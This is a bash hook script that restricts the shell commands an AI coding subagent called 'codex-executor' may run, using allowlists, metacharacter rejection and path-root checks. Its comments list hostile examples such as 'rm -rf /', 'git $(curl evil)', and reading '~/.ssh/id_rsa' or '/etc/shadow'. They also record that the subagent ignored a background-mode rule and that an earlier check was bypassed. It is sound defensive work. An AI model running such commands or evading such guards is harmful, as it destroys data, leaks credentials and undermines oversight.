#!/usr/bin/env bash
# PreToolUse guard for the `codex-executor` subagent.
#
# Threat model: defends against accidental misuse AND prompt-injected misuse by
# the codex-executor subagent itself. Stops:
#   - Command-chaining bypasses (`git status; rm -rf /`, `git $(curl evil)`,
#     `git status >/etc/cron.d/x`, `find . -exec sh -c …`).
#   - Arbitrary-file exfiltration via read-only verbs (`cat ~/.ssh/id_rsa`,
#     `cat /etc/shadow`, `ls /home/*/.ssh`).
#   - Mutation via "read-only" git subcommands that aren't actually read-only
#     (`git stash drop|pop|push|clear`, `git log --output=/path`).
#
# Wired into ~/.claude/settings.json as a PreToolUse hook with matcher "Bash".
# No-op for any other agent (main thread, other subagents).
#
# Allow rules (all must hold; first hit wins):
#   1. Command contains NO shell composition / substitution / redirection
#      metacharacters: ;  &  |  $  `  (  )  <  >  {  }  \  CR  newline.
#   2. First whitespace-delimited token is one of:
#      - the adapters/codex/dispatch.sh path (tilde or absolute form)
#      - one of the read-only verbs in $READONLY_VERBS
#      - `git` (further restricted to read-only subcommands and flags)
#   3. After a positive verb match, every positional (non-flag) arg starting
#      with `/` or `~` must resolve under one of $READ_ROOTS.
#   4. No arg may contain a glob char (`*` `?` `[` `]`).
#
# Bypass: set PM_HOOK_CODEX_GUARD=off in the environment to skip enforcement
# for the duration of that env. Each bypass is logged.
#
# Read roots: comma-or-colon-separated absolute paths via
# PM_HOOK_CODEX_READ_ROOTS. Defaults to "$HOME/github:/tmp".
#
# Audit log: every evaluated firing (allow / deny / bypass) is appended to
# $PM_HOOK_LOG_DIR/hooks.log (default ~/.claude/logs/hooks.log). No-ops for
# other agents are not logged.

set -uo pipefail

_SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd)"
# Resolve symlink so we find the real scripts/ directory (e.g., when invoked
# via adapters/<name>/bash-guard.sh).
if [[ -L "${BASH_SOURCE[0]}" ]]; then
  _symlink_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd)"
  _real="$(readlink -f "${BASH_SOURCE[0]}" 2>/dev/null)"
  if [[ -z "$_real" ]]; then
    _target="$(readlink "${BASH_SOURCE[0]}" 2>/dev/null)"
    if [[ -n "$_target" ]]; then
      case "$_target" in
        /*)   _real="$_target" ;;
        */*)  _real="$(cd "$_symlink_dir/${_target%/*}" 2>/dev/null && pwd)/${_target##*/}" ;;
        *)    _real="$_symlink_dir/$_target" ;;
      esac
    fi
  fi
  [[ -n "${_real:-}" ]] && _SCRIPT_DIR="$(cd "$(dirname "$_real")" 2>/dev/null && pwd || printf '%s' "$_SCRIPT_DIR")"
  unset _real _symlink_dir _target
fi
# shellcheck source=scripts/lib/portable.sh
. "$_SCRIPT_DIR/lib/portable.sh"

HOOK_NAME="hook-codex-bash-guard"
LOG_DIR="${PM_HOOK_LOG_DIR:-$HOME/.claude/logs}"
LOG_FILE="$LOG_DIR/hooks.log"
HK_BYPASS_ENV="PM_HOOK_CODEX_GUARD"
# shellcheck source=scripts/lib/hook-framework.sh
. "$_SCRIPT_DIR/lib/hook-framework.sh"

DISPATCH_ABS="${PM_HOOK_DISPATCH_ABS:-$(cd "$_SCRIPT_DIR/.." 2>/dev/null && pwd)/adapters/codex/dispatch.sh}"
_ABS_NO_HOME="${DISPATCH_ABS#"$HOME/"}"
DISPATCH_REL="~/$_ABS_NO_HOME"
unset _SCRIPT_DIR _ABS_NO_HOME

READ_ROOTS_RAW="${PM_HOOK_CODEX_READ_ROOTS:-$HOME/github:/tmp}"
# Split on either : or , for ergonomics; collect non-empty entries.
IFS=':,' read -r -a READ_ROOTS <<<"$READ_ROOTS_RAW"

# Read-only verbs allowed for verify/inspection steps. NOT included on purpose:
#   find  — `-exec`/`-delete`/`-fprint` are RCE / destructive
#   sed   — without strict flag parsing, can edit files
#   awk   — `system()` shells out
#   bash sh env xargs — composition primitives we explicitly want to deny
READONLY_VERBS=(cat ls head tail wc grep pwd realpath dirname basename jq test sleep date echo true false)

# git subcommands that are unconditionally read-only (no further arg/subverb
# restriction needed). `branch` and `stash` are NOT here — they have their own
# gates further down because some of their forms mutate. Keeping them out of
# this array means a regression (e.g. accidentally removing the gate) fails
# closed: subcmd not in array → deny.
GIT_READONLY_SUBCMDS=(status log diff show rev-parse ls-files describe)

# Flag prefixes that CAUSE A WRITE on git read-only subcommands. Rejected on
# any git invocation regardless of subcommand.
GIT_WRITE_FLAGS=(--output --out-file --output-directory)

# ---------- helpers ----------

hk_deny_message() {
  local reason="$1"
  cat >&2 <<EOF
codex-executor: blocked by $HOOK_NAME — $reason

  attempted: ${command:-(empty)}

Allowed:
  - $DISPATCH_REL ...   (canonical dispatch path)
  - $DISPATCH_ABS ...
  - git <read-only subcommand> ...     (subcmds: ${GIT_READONLY_SUBCMDS[*]})
  - git -C <dir> <read-only subcommand> ...
  - one of: ${READONLY_VERBS[*]}

Path args starting with / or ~ must resolve under a read root:
  ${READ_ROOTS[*]}
(override: PM_HOOK_CODEX_READ_ROOTS=path1:path2 ...)

Disallowed (always):
  shell composition / substitution / redirection — ;  &  |  \$  \`  (  )  <  >  {  }  \\  CR  newline
  glob characters in args — *  ?  [  ]
  destructive git — push, reset, commit, rebase, checkout, merge, branch -d/-D, stash drop/pop/push/clear, --output=
  find, sed, awk, bash, sh, env, xargs

Never call \`codex exec\` directly — adapters/codex/dispatch.sh encodes sandbox / approval /
trace flags the rest of the pipeline relies on.

Bypass for one turn: set PM_HOOK_CODEX_GUARD=off (logged).
EOF
}

is_under_read_root() {
  local p="$1" abs r
  abs="$(realpath_m "$p" 2>/dev/null)" || return 1
  for r in "${READ_ROOTS[@]}"; do
    [[ -z "$r" ]] && continue
    # Normalize root and ensure trailing slash so /foo doesn't match /foobar.
    local r_abs
    r_abs="$(realpath_m "$r" 2>/dev/null)" || continue
    [[ "$r_abs" != */ ]] && r_abs="$r_abs/"
    case "$abs/" in
      "$r_abs"*) return 0 ;;
    esac
  done
  return 1
}

# Validate a single arg-string against path/traversal/glob policy.
#   - reject `..` as a path segment (closes `cat ../etc/passwd` style escapes)
#   - reject any glob char (`*` `?` `[` `]`)
#   - reject tilde paths (codex should use absolute)
#   - require absolute paths to resolve under a read root
# Used for both bare positional args and `--flag=VALUE` forms (where VALUE is
# extracted by the caller).
validate_path_token() {
  local p="$1" what="${2:-arg}"

  # Globs anywhere are denied.
  case "$p" in
    *\**|*\?*|*\[*|*\]*) hk_deny "glob char in $what: $p" "$command" ;;
  esac

  # `..` as a path segment (e.g. `..`, `../foo`, `foo/..`, `foo/../bar`).
  # Pure substring check would reject `foo..bar` (legitimate); restrict to
  # cases where `..` is bounded by `/` or string edges.
  if [[ "$p" =~ (^|/)\.\.($|/) ]]; then
    hk_deny "path traversal (\`..\`) in $what: $p" "$command"
  fi

  case "$p" in
    "~"*) hk_deny "tilde path in $what (use absolute under a read root): $p" "$command" ;;
    /*)   is_under_read_root "$p" || hk_deny "path $what outside read roots: $p" "$command" ;;
  esac
}

# Validate every positional arg after the verb. Inspects flag VALUE portions for
# the three forms a path can hide in:
#   --flag=VALUE   (long with equals)        — closes grep --file=/etc/shadow
#   -f=VALUE       (short with equals)        — closes grep -f=/etc/shadow
#   -fVALUE        (short, value attached)    — closes grep -f/etc/shadow
# Bare flags (`--flag` alone, `-i`, `-iE`) and `--flag VALUE` (space form) skip
# extraction here; the space-form value is treated as a positional on the next
# loop iteration and validated normally.
validate_args() {
  local start="${1:-1}"
  local i p val rest
  for ((i=start; i<${#parts[@]}; i++)); do
    p="${parts[i]}"
    [[ -z "$p" ]] && continue

    # `-flag=VALUE` form (long or short): validate VALUE.
    if [[ "$p" == -*=* ]]; then
      val="${p#*=}"
      [[ -n "$val" ]] && validate_path_token "$val" "flag value"
      continue
    fi

    # Bundled short flag `-X<rest>` (one or more single-letter flags optionally
    # followed by a value). To catch path-taking flags bundled behind other
    # short flags — `-rf/etc/passwd` (recursive + file-of-patterns), `-irf...`,
    # `-nf...`, `jq -rf...` — peel leading [A-Za-z] flag chars from `rest` and
    # check at each step whether what remains starts a path. Combined short
    # flags like `-iE` (rest=`E`) and pattern-shaped like `-rfoo` (rest with
    # no path-shape) end the loop without validating; treated as flags.
    if [[ "$p" =~ ^-[A-Za-z0-9].+$ ]]; then
      scan_rest="${p:2}"
      while [[ -n "$scan_rest" ]]; do
        case "$scan_rest" in
          /*|"~"*)
            validate_path_token "$scan_rest" "short flag value"
            break
            ;;
        esac
        if [[ "$scan_rest" =~ (^|/)\.\.($|/) ]]; then
          validate_path_token "$scan_rest" "short flag value"
          break
        fi
        case "$scan_rest" in
          [A-Za-z0-9]*) scan_rest="${scan_rest:1}" ;;
          *) break ;;
        esac
      done
      continue
    fi

    # Long flag (--foo) or any other dash-prefixed token (e.g. `-`).
    if [[ "$p" == -* ]]; then
      continue
    fi

    validate_path_token "$p" "arg"
  done
}

validate_dispatch_args() {
  local i p val
  for ((i=1; i<${#parts[@]}; i++)); do
    p="${parts[i]}"
    case "$p" in
      --brief-file=*)
        val="${p#*=}"
        [[ -n "$val" ]] || hk_deny "--brief-file requires a path" "$command"
        validate_path_token "$val" "--brief-file"
        ;;
      --brief-file)
        if [[ -z "${parts[i+1]:-}" ]]; then
          hk_deny "--brief-file requires a path" "$command"
        fi
        validate_path_token "${parts[i+1]}" "--brief-file"
        ;;
    esac
  done

  validate_args 1
}

# ---------- preflight ----------

hk_require_jq
hk_require_realpath

# ---------- parse input ----------
# Read input first so bypass and audit lines can include agent/tool identity.

hk_read_json

# No-op for any caller other than the codex-executor subagent / Bash tool.
[[ "$HK_AGENT_TYPE" != "codex-executor" ]] && exit 0
[[ "$HK_TOOL_NAME" != "Bash" ]] && exit 0

command="$(hk_jq '.tool_input.command // ""')" || {
  hk_audit deny "jq failed on tool_input.command" ""
  echo "$HOOK_NAME: malformed JSON on stdin — denying" >&2
  exit 2
}
HK_TARGET="$command"

# Bypass AFTER parse so audit line records the actual call being bypassed.
hk_check_bypass PM_HOOK_CODEX_GUARD

# Reject background mode. The dispatch script must run foreground so the
# codex-executor subagent process stays alive until codex finishes; otherwise
# the harness orphans the background job mid-run (see codex-executor.md
# §Dispatch "What goes wrong with background mode"). The doc-level rule was
# repeatedly ignored by the subagent — enforce structurally.
#
# Multi-path JSON check: the Claude Code harness payload shape for the
# `run_in_background` flag is undocumented. An initial fix that only checked
# `.tool_input.run_in_background` was bypassed in the wild (2026-05-11). Three
# plausible paths are checked; treat the multi-path strategy as deliberate
# policy, not a TODO — the right fix is `+= path on next bypass observation`
# rather than `pick one canonical path`.
run_in_bg_a="$(hk_jq '.tool_input.run_in_background // empty')"
run_in_bg_b="$(hk_jq '.run_in_background // empty')"
run_in_bg_c="$(hk_jq '.tool_options.run_in_background // empty')"

if [[ "$run_in_bg_a" == "true" || "$run_in_bg_b" == "true" || "$run_in_bg_c" == "true" ]]; then
  hk_deny "run_in_background:true forbidden on codex-executor Bash (orphans dispatch — see codex-executor.md §Dispatch)" "$command"
fi

if [[ -z "$command" ]]; then
  hk_deny "tool_input.command empty" "$command"
fi

# ---------- character-level rejection ----------
#
# Reject any character that lets bash compose, substitute, or redirect — i.e.
# anything that turns one tool_input.command into N actual commands or a write.
#
# Rejected: ;  &  |  $  `  (  )  <  >  {  }  \   plus literal CR/LF.
# Permitted: tilde (~), normal punctuation, whitespace (note: our
# tokenizer doesn't honor quotes, so quoted strings tokenize on whitespace —
# document this as a known parse limitation).

if [[ "$command" == *$'\n'* ]]; then
  hk_deny "newline in command" "$command"
fi
if [[ "$command" == *$'\r'* ]]; then
  hk_deny "carriage return in command" "$command"
fi

# Quotes are rejected because our tokenizer (`read -r -a`) does NOT honor shell
# quoting — a quoted absolute path would be stored as `"/etc/passwd"` and skip
# the path-validation case statement (which only matches `/*` literally). Since
# command chaining is forbidden anyway, quotes serve no purpose here.
if [[ "$command" == *\"* ]]; then
  hk_deny "double-quote in command" "$command"
fi
if [[ "$command" == *\'* ]]; then
  hk_deny "single-quote in command" "$command"
fi

if [[ "$command" =~ [\;\&\|\$\`\(\)\<\>\{\}\\] ]]; then
  hk_deny "shell metacharacter in command (one of ;&|\$\`()<>{}\\)" "$command"
fi

# ---------- tokenize ----------
#
# The canonical dispatch path may itself contain spaces — on Windows the user
# directory is e.g. `C:\Users\Lien Chen\...` -> `/c/Users/Lien Chen/...`. Our
# whitespace tokenizer (`read -r -a`) would split that path and truncate the
# verb to `/c/Users/Lien`, breaking the dispatch allowlist match. The dispatch
# path is a trusted constant, so detect an invocation by literal prefix (a
# bare path, or the path followed by a space) and tokenize only the remainder,
# re-seating the full path as parts[0]. On platforms where the path has no
# space (Linux/macos) this yields the exact same parts[] as the plain split.
_dispatch_prefix=""
if [[ "$command" == "$DISPATCH_ABS" || "$command" == "$DISPATCH_ABS "* ]]; then
  _dispatch_prefix="$DISPATCH_ABS"
elif [[ "$command" == "$DISPATCH_REL" || "$command" == "$DISPATCH_REL "* ]]; then
  _dispatch_prefix="$DISPATCH_REL"
fi

if [[ -n "$_dispatch_prefix" ]]; then
  _dispatch_rest="${command#"$_dispatch_prefix"}"
  read -r -a parts <<<"$_dispatch_rest"
  parts=("$_dispatch_prefix" "${parts[@]}")
  unset _dispatch_rest
else
  read -r -a parts <<<"$command"
fi
unset _dispatch_prefix
verb="${parts[0]:-}"

# ---------- allowlist: dispatch script ----------

case "$verb" in
  "$DISPATCH_REL"|"$DISPATCH_ABS")
    # Validate any path args after the verb (e.g. --cd <abs>); brief is the
    # final arg and may legitimately be a non-path string.
    validate_dispatch_args
    hk_allow "dispatch script" "$command"
    ;;
esac

# ---------- allowlist: git read-only ----------

if [[ "$verb" == "git" ]]; then
  # Reject git-level write flags up front, regardless of subcommand.
  for ((i=1; i<${#parts[@]}; i++)); do
    p="${parts[i]}"
    for wf in "${GIT_WRITE_FLAGS[@]}"; do
      case "$p" in
        "$wf"|"$wf"=*) hk_deny "git write flag: $p" "$command" ;;
      esac
    done
  done

  # Two supported forms:
  #   git <subcmd> [...]
  #   git -C <dir> <subcmd> [...]
  # Anything else (e.g. `git --git-dir=...`, `git -c key=val`, `git -C=dir`,
  # `git -Cdir`) is rejected to keep parsing simple and avoid mis-classifying
  # option arguments as subcommands.
  if [[ "${parts[1]:-}" == "-C" ]]; then
    if [[ -z "${parts[2]:-}" || -z "${parts[3]:-}" ]]; then
      hk_deny "git -C requires <dir> <subcmd>" "$command"
    fi
    # Validate the -C directory against read roots before accepting the
    # subcommand. Without this `git -C /etc status` would let `git ls-files`
    # enumerate /etc and `git log` read tracked file contents.
    validate_path_token "${parts[2]}" "git -C dir"
    subcmd="${parts[3]}"
    rest_start=4
  elif [[ -n "${parts[1]:-}" && "${parts[1]}" != -* ]]; then
    subcmd="${parts[1]}"
    rest_start=2
  else
    hk_deny "unsupported git form (only \`git <subcmd>\` and \`git -C <dir> <subcmd>\` allowed)" "$command"
  fi

  allowed=0
  for s in "${GIT_READONLY_SUBCMDS[@]}"; do
    [[ "$subcmd" == "$s" ]] && allowed=1 && break
  done

  if [[ "$subcmd" == "branch" ]]; then
    allowed=1
    for ((i=rest_start; i<${#parts[@]}; i++)); do
      case "${parts[i]}" in
        -d|-D|--delete|-m|-M|--move|-c|-C|--copy|--unset-upstream|--set-upstream-to=*|--track=*|--no-track|--edit-description|-f|--force)
          hk_deny "git branch with destructive/mutating flag: ${parts[i]}" "$command"
          ;;
      esac
    done
  fi

  if [[ "$subcmd" == "stash" ]]; then
    # Bare `git stash` defaults to `git stash push` (mutating). Require an
    # explicit read-only subverb.
    stash_sub="${parts[rest_start]:-}"
    case "$stash_sub" in
      list|show)
        allowed=1
        ;;
      "")
        hk_deny "bare 'git stash' is mutating (defaults to push); use 'git stash list' or 'git stash show'" "$command"
        ;;
      *)
        hk_deny "git stash subverb not in read-only allowlist: $stash_sub (allowed: list, show)" "$command"
        ;;
    esac
  fi

  if [[ "$allowed" == "1" ]]; then
    validate_args "$rest_start"
    hk_allow "git $subcmd" "$command"
  fi
  hk_deny "git subcommand not in read-only allowlist: $subcmd" "$command"
fi

# ---------- allowlist: read-only verbs ----------

for v in "${READONLY_VERBS[@]}"; do
  if [[ "$verb" == "$v" ]]; then
    validate_args 1
    hk_allow "verb $v" "$command"
  fi
done

# ---------- default deny ----------

hk_deny "verb not in allowlist: $verb" "$command"
